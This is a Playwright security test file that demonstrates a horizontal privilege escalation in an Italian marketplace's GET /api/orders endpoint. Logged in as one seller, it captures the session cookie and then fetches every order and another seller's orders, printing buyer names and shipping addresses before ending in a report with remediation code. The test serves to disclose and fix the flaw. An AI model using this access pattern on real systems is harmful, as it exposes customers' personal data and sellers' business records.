/**
 * AUTHZ VULNERABILITY: Seller Filter Bypass
 *
 * Target: GET /api/orders
 * Vulnerability Type: Horizontal Privilege Escalation / Authorization Bypass
 *
 * Description:
 * The endpoint allows sellers to view orders but does NOT validate that the
 * 'seller' query parameter matches the authenticated user's ID. This allows
 * any seller to:
 *   1. View ALL orders by omitting the seller parameter
 *   2. View specific other sellers' orders by providing their seller ID
 *   3. Access sensitive customer data they should not see
 *
 * Vulnerable Code (lines 30-34 in src/app/api/orders/route.ts):
 *   const seller = searchParams.get('seller') || '';
 *   const sellerFilter = seller ? { seller } : {};
 *   const orders = await OrderModel.find({ ...sellerFilter }).populate('user', 'name');
 */

import { test, expect } from '@playwright/test';

test.describe('AUTHZ Vulnerability - Seller Filter Bypass on GET /api/orders', () => {
  let sessionCookie: string;
  let marioId: string;
  let giuliaId: string;

  test('Step 1: Login as Mario (Seller 1)', async ({ page }) => {
    console.log('\n[*] Step 1: Authenticating as Mario (mario@example.com)');

    await page.goto('/signin');

    // Fill credentials
    await page.getByPlaceholder('Inserisci la tua email').fill('mario@example.com');
    await page.getByPlaceholder('Inserisci la tua password').fill('password123');

    // Submit
    await page.getByRole('button', { name: 'Accedi' }).click();

    // Wait for redirect
    await page.waitForURL('/', { timeout: 10000 });

    console.log('   ✓ Login successful');

    // Get session cookie
    const cookies = await page.context().cookies();
    const sessionCookies = cookies.filter(
      (c) =>
        c.name === 'next-auth.session-token' ||
        c.name === '__Secure-next-auth.session-token'
    );

    if (sessionCookies.length > 0) {
      sessionCookie = `${sessionCookies[0].name}=${sessionCookies[0].value}`;
      console.log(`   Session cookie captured: ${sessionCookie.substring(0, 50)}...`);
    }

    // Get user info from session
    const response = await page.request.get('/api/auth/session');
    const session = await response.json();

    marioId = session.user?.id;
    console.log(`   User ID: ${marioId}`);
    console.log(`   Email: ${session.user?.email}`);
    console.log(`   isSeller: ${session.user?.isSeller}`);
    console.log(`   isAdmin: ${session.user?.isAdmin}`);

    expect(marioId).toBeTruthy();
    expect(session.user?.isSeller).toBe(true);
  });

  test('Step 2: Get Giulia\'s user ID (another seller)', async ({ page }) => {
    console.log('\n[*] Step 2: Getting another seller\'s ID from products');

    // Get products to find another seller ID
    const response = await page.request.get('/api/products');
    const products = await response.json();

    console.log(`   Found ${products.length} products`);

    // Find a product from a different seller
    const otherSellerProduct = products.find(
      (p: any) => p.seller && p.seller !== marioId
    );

    if (otherSellerProduct) {
      giuliaId = otherSellerProduct.seller;
      console.log(`   Found another seller ID: ${giuliaId}`);
      console.log(`   (Likely Giulia based on seed data)`);
    } else {
      console.log('   ⚠ No other seller found in products');
    }

    expect(giuliaId).toBeTruthy();
    expect(giuliaId).not.toBe(marioId);
  });

  test('Step 3: EXPLOIT - Fetch ALL orders without seller filter', async ({ page }) => {
    console.log('\n[*] Step 3: Testing GET /api/orders WITHOUT seller filter');
    console.log('   Request: GET /api/orders');
    console.log('   Expected: Should only return Mario\'s orders');
    console.log('   Actual: Will return ALL orders in system');

    const response = await page.request.get('/api/orders');

    expect(response.status()).toBe(200);

    const orders = await response.json();
    console.log(`\n   ✗ VULNERABILITY: Received ${orders.length} orders`);

    if (orders.length > 0) {
      // Extract unique seller IDs
      const sellerIds = [...new Set(orders.map((o: any) => o.seller))];
      console.log(`   Found orders from ${sellerIds.length} different seller(s)`);

      sellerIds.forEach((id: string) => {
        if (id === marioId) {
          console.log(`     - ${id} (Mario - authenticated user) ✓`);
        } else {
          console.log(`     - ${id} (OTHER SELLER - should NOT be visible!) ✗`);
        }
      });

      // Show sample order
      const sampleOrder = orders[0];
      console.log('\n   Sample order data:');
      console.log(`     Order ID: ${sampleOrder._id}`);
      console.log(`     Seller: ${sampleOrder.seller}`);
      console.log(`     Buyer: ${sampleOrder.user?.name || sampleOrder.user}`);
      console.log(`     Items: ${sampleOrder.orderItems?.length || 0}`);
      console.log(`     Total: ${sampleOrder.totalPriceEuro || sampleOrder.totalPriceVal}`);

      // Verify we can access other sellers' orders
      const otherSellerOrders = orders.filter((o: any) => o.seller !== marioId);
      if (otherSellerOrders.length > 0) {
        console.log(
          `\n   ✗✗✗ CRITICAL: Can access ${otherSellerOrders.length} orders from other sellers!`
        );
      }
    }

    // Save evidence
    console.log('\n   [EVIDENCE] All orders response:');
    console.log(JSON.stringify(orders, null, 2).substring(0, 1000) + '...');
  });

  test('Step 4: Fetch own orders (with Mario\'s seller ID)', async ({ page }) => {
    console.log('\n[*] Step 4: Testing GET /api/orders?seller=' + marioId);
    console.log('   (Fetching own orders - expected behavior)');

    const response = await page.request.get(`/api/orders?seller=${marioId}`);

    expect(response.status()).toBe(200);

    const orders = await response.json();
    console.log(`   ✓ Received ${orders.length} orders (Mario's orders)`);

    // Verify all orders belong to Mario
    if (orders.length > 0) {
      const allMarios = orders.every((o: any) => o.seller === marioId);
      expect(allMarios).toBe(true);
      console.log('   ✓ All orders belong to authenticated user');
    }
  });

  test('Step 5: EXPLOIT - Fetch other seller\'s orders (Giulia)', async ({ page }) => {
    console.log('\n[*] Step 5: Testing GET /api/orders?seller=' + giuliaId);
    console.log('   Target: Giulia\'s orders');
    console.log('   Expected: Should receive 403 Forbidden');
    console.log('   Actual: Will return Giulia\'s orders');

    const response = await page.request.get(`/api/orders?seller=${giuliaId}`);

    console.log(`\n   HTTP Status: ${response.status()}`);

    if (response.status() === 200) {
      const orders = await response.json();
      console.log(`   ✗✗✗ CRITICAL VULNERABILITY CONFIRMED! ✗✗✗`);
      console.log(`   Successfully accessed ${orders.length} orders from another seller!`);
      console.log('');
      console.log('   This is a Horizontal Privilege Escalation vulnerability.');
      console.log('   Mario (Seller 1) can view Giulia\'s (Seller 2) orders including:');
      console.log('     - Customer names and contact information');
      console.log('     - Shipping addresses');
      console.log('     - Order items and pricing');
      console.log('     - Payment methods');
      console.log('');

      if (orders.length > 0) {
        const sampleOrder = orders[0];
        console.log('   Sample exposed order:');
        console.log(`     Order ID: ${sampleOrder._id}`);
        console.log(`     Seller: ${sampleOrder.seller}`);
        console.log(`     Buyer: ${sampleOrder.user?.name || sampleOrder.user}`);

        if (sampleOrder.shippingAddress) {
          console.log('     Shipping Address:');
          console.log(`       Name: ${sampleOrder.shippingAddress.fullName || 'N/A'}`);
          console.log(`       Address: ${sampleOrder.shippingAddress.address || 'N/A'}`);
          console.log(
            `       City: ${sampleOrder.shippingAddress.city || 'N/A'}, ${sampleOrder.shippingAddress.postalCode || 'N/A'}`
          );
        }

        console.log('\n   [EVIDENCE] Unauthorized order access:');
        console.log(JSON.stringify(sampleOrder, null, 2).substring(0, 1000) + '...');
      }

      // Test should fail if vulnerability exists
      expect(response.status()).toBe(403);
    } else if (response.status() === 403) {
      console.log('   ✓ Properly blocked with 403 Forbidden');
    } else {
      console.log(`   ⚠ Unexpected status: ${response.status()}`);
    }
  });

  test('Step 6: Generate Exploitation Report', async ({ page }) => {
    console.log('\n' + '='.repeat(80));
    console.log('SECURITY TEST REPORT: Seller Filter Bypass Vulnerability');
    console.log('='.repeat(80));

    console.log('\n[VULNERABILITY DETAILS]');
    console.log('Vulnerability Type: Horizontal Privilege Escalation');
    console.log('Affected Endpoint: GET /api/orders');
    console.log('Severity: HIGH');
    console.log('CVSS Score: 7.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)');

    console.log('\n[ROOT CAUSE]');
    console.log(
      'File: /Users/chocos/Desktop/pagine_azzurre/nextjs/src/app/api/orders/route.ts'
    );
    console.log('Lines: 30-34');
    console.log('\nVulnerable Code:');
    console.log('```typescript');
    console.log("const seller = searchParams.get('seller') || '';");
    console.log('const sellerFilter = seller ? { seller } : {};');
    console.log(
      "const orders = await OrderModel.find({ ...sellerFilter }).populate('user', 'name');"
    );
    console.log('```');

    console.log('\n[VULNERABILITY DESCRIPTION]');
    console.log('The endpoint performs role-based authentication (isSeller or isAdmin)');
    console.log('but fails to implement proper authorization. It accepts a user-controlled');
    console.log("'seller' query parameter without validating it matches the authenticated");
    console.log("user's ID. This allows any seller to:");
    console.log('  1. View ALL orders by omitting the seller parameter');
    console.log("  2. View specific sellers' orders by providing their seller ID");
    console.log('  3. Access sensitive buyer information they should not see');

    console.log('\n[IMPACT ANALYSIS]');
    console.log('Confidentiality: HIGH');
    console.log("  - Sellers can access competitors' sales data");
    console.log('  - Customer PII exposed (names, addresses, contact info)');
    console.log('  - Business intelligence leaked (sales volume, pricing)');
    console.log('\nBusiness Impact:');
    console.log('  - Competitive disadvantage');
    console.log('  - Loss of customer trust');
    console.log('  - GDPR/privacy law violations');
    console.log('  - Reputation damage');

    console.log('\n[REMEDIATION]');
    console.log('Add authorization check after authentication:\n');
    console.log('```typescript');
    console.log("const seller = searchParams.get('seller') || '';");
    console.log('');
    console.log('// FIXED: Validate seller parameter matches authenticated user');
    console.log('if (seller && seller !== session.user.id && !session.user.isAdmin) {');
    console.log('  return NextResponse.json(');
    console.log("    { message: 'Non autorizzato a visualizzare ordini di altri venditori' },");
    console.log('    { status: 403 }');
    console.log('  );');
    console.log('}');
    console.log('');
    console.log('// If no seller specified and user is not admin, use their ID');
    console.log('const sellerFilter = seller');
    console.log('  ? { seller }');
    console.log('  : session.user.isAdmin');
    console.log('    ? {}  // Admins can see all');
    console.log('    : { seller: session.user.id };  // Sellers only see their own');
    console.log('```');

    console.log('\n' + '='.repeat(80));
  });
});
